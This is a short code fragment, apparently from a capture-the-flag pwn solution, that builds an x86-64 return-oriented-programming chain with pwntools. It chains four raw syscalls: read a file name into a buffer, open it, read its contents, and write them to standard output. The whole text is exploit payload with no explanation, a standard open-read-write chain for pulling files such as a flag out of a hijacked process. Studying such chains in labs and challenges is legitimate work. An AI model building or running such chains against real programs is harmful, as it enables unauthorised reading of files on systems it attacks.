# read
Rop = p64(rax) + p64(0x0) + p64(rdi) + p64(0x0) + p64(rsi) + p64(readable_adr) + p64(rdx) + p64(0x4) + p64(syscall)
# open
Rop+= p64(rax) + p64(0x2) + p64(rdi) + p64(readable_adr) + p64(rsi) + p64(0x0) + p64(rdx) + p64(0x0) + p64(syscall)
# read
Rop+= p64(rax) + p64(0x0) + p64(rdi) + p64(3) + p64(rsi) + p64(readable_adr) + p64(rdx) + p64(0x100) + p64(syscall)
# write
Rop+= p64(rax) + p64(0x1) + p64(rdi) + p64(1) + p64(rsi) + p64(readable_adr) + p64(rdx) + p64(0x70) + p64(syscall)